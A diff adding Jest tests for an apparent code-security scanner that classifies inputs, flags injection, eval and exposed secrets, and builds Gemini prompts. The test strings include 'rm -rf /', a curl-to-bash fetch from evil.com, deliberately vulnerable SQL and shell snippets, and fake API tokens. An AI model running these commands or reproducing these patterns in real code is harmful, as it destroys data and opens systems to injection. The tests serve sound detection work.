@@ -630,4 +630,235 @@ describe('Phase 4.7: Safety Checkup MVP Test Suite', () => {
       expect(formatted).not.toContain('Legitimate organizations never request OTPs');
     });
   });
+
+  // =========================================================================
+  // PHASE 6.3: CODE & SCRIPT SECURITY INTELLIGENCE INTEGRATION TESTS
+  // =========================================================================
+  describe('Phase 6.3: Code & Script Security Intelligence Integration', () => {
+    it('1. InputClassifier routes fenced code blocks, shebangs, terminal commands, and SQL to code', () => {
+      // Fenced JavaScript
+      expect(InputClassifier.classify({
+        rawContent: '```javascript\nconsole.log(1);\n```',
+      })).toBe('code');
+
+      // Shebang script
+      expect(InputClassifier.classify({
+        rawContent: '#!/bin/bash\nrm -rf /',
+      })).toBe('code');
+
+      // Shell pipeline execution
+      expect(InputClassifier.classify({
+        rawContent: 'curl -sSL https://evil.com/setup.sh | bash',
+      })).toBe('code');
+
+      // SQL statement
+      expect(InputClassifier.classify({
+        rawContent: "SELECT * FROM users WHERE id = '",
+      })).toBe('code');
+
+      // Terminal package manager command
+      expect(InputClassifier.classify({
+        rawContent: 'npm install malicious-package',
+      })).toBe('code');
+
+      // PHP open tag
+      expect(InputClassifier.classify({
+        rawContent: '<?php echo "test"; ?>',
+      })).toBe('code');
+
+      // Go code
+      expect(InputClassifier.classify({
+        rawContent: 'package main\nfunc main() {}',
+      })).toBe('code');
+
+      // Valid JSON object
+      expect(InputClassifier.classify({
+        rawContent: '{"apiKey": "xyz123", "debug": true}',
+      })).toBe('code');
+    });
+
+    it('2. InputClassifier preserves natural language and question queries as message', () => {
+      expect(InputClassifier.classify({
+        rawContent: 'How do I write a Python function?',
+      })).toBe('message');
+
+      expect(InputClassifier.classify({
+        rawContent: 'Can you explain how SQL injection works in modern web applications?',
+      })).toBe('message');
+
+      expect(InputClassifier.classify({
+        rawContent: 'What does the rm -rf command do?',
+      })).toBe('message');
+
+      expect(InputClassifier.classify({
+        rawContent: 'Why is eval considered dangerous in JavaScript?',
+      })).toBe('message');
+    });
+
+    it('3. End-to-end code security scan identifies exposed GitHub secret with immediate redaction', async () => {
+      const codeSnippet = `
+        import os
+        GITHUB_TOKEN = "ghp_123456789012345678901234567890123456"
+        def get_repos():
+            pass
+      `;
+
+      const report = await SafetyService.analyze({
+        rawContent: codeSnippet,
+        filename: 'script.py',
+      });
+
+      expect(report.inputType).toBe('code');
+      expect(report.riskLevel).toBe('critical');
+      expect(report.score).toBeGreaterThanOrEqual(50);
+
+      // Verify secret finding
+      const secretFinding = report.findings.find(f => f.type === 'exposed_secret');
+      expect(secretFinding).toBeDefined();
+      expect(secretFinding?.description).toContain('[REDACTED_');
+      expect(secretFinding?.description).not.toContain('ghp_123456789012345678901234567890123456');
+      expect(secretFinding?.metadata?.secretClass).toBe('github_token');
+      expect(secretFinding?.metadata?.lineNumber).toBeDefined();
+
+      // Verify recommendation
+      const rec = report.recommendations.find(r => r.action === 'rotate_exposed_secret');
+      expect(rec).toBeDefined();
+    });
+
+    it('4. End-to-end code security scan identifies SQL injection with parameterized recommendation', async () => {
+      const sqlSnippet = `
+        const query = "SELECT * FROM users WHERE email = '" + req.body.email + "'";
+        db.query(query);
+      `;
+
+      const report = await SafetyService.analyze({
+        rawContent: sqlSnippet,
+        filename: 'auth.js',
+      });
+
+      expect(report.inputType).toBe('code');
+      expect(report.riskLevel).toBe('high');
+      expect(report.score).toBeGreaterThanOrEqual(25);
+
+      const sqlFinding = report.findings.find(f => f.type === 'sql_injection_pattern');
+      expect(sqlFinding).toBeDefined();
+      expect(sqlFinding?.severity).toBe('high');
+
+      const rec = report.recommendations.find(r => r.action === 'use_parameterized_queries');
+      expect(rec).toBeDefined();
+    });
+
+    it('5. End-to-end code security scan identifies command injection with avoid_shell_execution recommendation', async () => {
+      const shellSnippet = `
+        import os
+        def backup(directory):
+            os.system("tar -czf backup.tar.gz " + directory)
+      `;
+
+      const report = await SafetyService.analyze({
+        rawContent: shellSnippet,
+        filename: 'backup.py',
+      });
+
+      expect(report.inputType).toBe('code');
+      expect(report.riskLevel).toBe('high');
+      expect(report.score).toBeGreaterThanOrEqual(25);
+
+      const cmdFinding = report.findings.find(f => f.type === 'command_injection_pattern');
+      expect(cmdFinding).toBeDefined();
+
+      const rec = report.recommendations.find(r => r.action === 'avoid_shell_execution');
+      expect(rec).toBeDefined();
+    });
+
+    it('6. End-to-end code security scan identifies dynamic eval with avoid_dynamic_eval recommendation', async () => {
+      const evalSnippet = `
+        function calculate(expression) {
+          return eval("Math." + expression);
+        }
+      `;
+
+      const report = await SafetyService.analyze({
+        rawContent: evalSnippet,
+        filename: 'calc.ts',
+      });
+
+      expect(report.inputType).toBe('code');
+      expect(report.riskLevel).toBe('high');
+      expect(report.score).toBeGreaterThanOrEqual(25);
+
+      const evalFinding = report.findings.find(f => f.type === 'dangerous_function');
+      expect(evalFinding).toBeDefined();
+
+      const rec = report.recommendations.find(r => r.action === 'avoid_dynamic_eval');
+      expect(rec).toBeDefined();
+    });
+
+    it('7. Canonical contract: Multiple High-severity findings elevate overall risk to CRITICAL (score >= 50)', async () => {
+      // Combines SQL injection (25 pts) + Command injection (25 pts) = 50 pts (CRITICAL)
+      const combinedSnippet = `
+        const sql = "SELECT * FROM records WHERE id = '" + userInput + "'";
+        const child = child_process.exec("cat " + filePath);
+      `;
+
+      const report = await SafetyService.analyze({
+        rawContent: combinedSnippet,
+        filename: 'service.js',
+      });
+
+      expect(report.inputType).toBe('code');
+      expect(report.score).toBeGreaterThanOrEqual(50);
+      expect(report.riskLevel).toBe('critical');
+    });
+
+    it('8. Clean benign code evaluates to LOW risk (score 0) with medium confidence', async () => {
+      const cleanSnippet = `
+        export function addNumbers(a: number, b: number): number {
+          return a + b;
+        }
+      `;
+
+      const report = await SafetyService.analyze({
+        rawContent: cleanSnippet,
+        filename: 'math.ts',
+      });
+
+      expect(report.inputType).toBe('code');
+      expect(report.riskLevel).toBe('low');
+      expect(report.confidenceLevel).toBe('medium');
+      expect(report.score).toBe(0);
+      expect(report.findings.length).toBe(0);
+      expect(report.recommendations[0].action).toBe('no_action_needed');
+    });
+
+    it('9. Gemini formatting instructions include Code & Script Security instructions with safe refactoring and secret protection', async () => {
+      const codeSnippet = 'const token = "sk_live_123456789012345678901234"; eval(token);';
+      const report = await SafetyService.analyze({
+        rawContent: codeSnippet,
+        filename: 'app.js',
+      });
+
+      const formatted = SafetyService.formatForGemini(report);
+      expect(formatted).toContain('Input Classification: CODE');
+      expect(formatted).toContain('CODE & SCRIPT SECURITY INSTRUCTIONS');
+      expect(formatted).toContain('safe, hardened refactoring patterns');
+      expect(formatted).toContain('SECRET PROTECTION');
+      expect(formatted).toContain('NEVER unredact, reconstruct, or output sensitive credentials');
+      expect(formatted).toContain('100% bug-free');
+      expect(formatted).not.toContain('sk_live_123456789012345678901234');
+    });
+
+    it('10. Dedicated SafetyService.analyzeCode API executes directly and returns detailed code result', async () => {
+      const res = await SafetyService.analyzeCode(
+        'import os\nos.system("ping " + host)',
+        'network.py'
+      );
+
+      expect(res.language).toBe('python');
+      expect(res.riskLevel).toBe('high');
+      expect(res.score).toBeGreaterThanOrEqual(25);
+      expect(res.vulnerabilities.length).toBeGreaterThan(0);
+      expect(res.characterCount).toBeGreaterThan(0);
+    });
+  });
 });
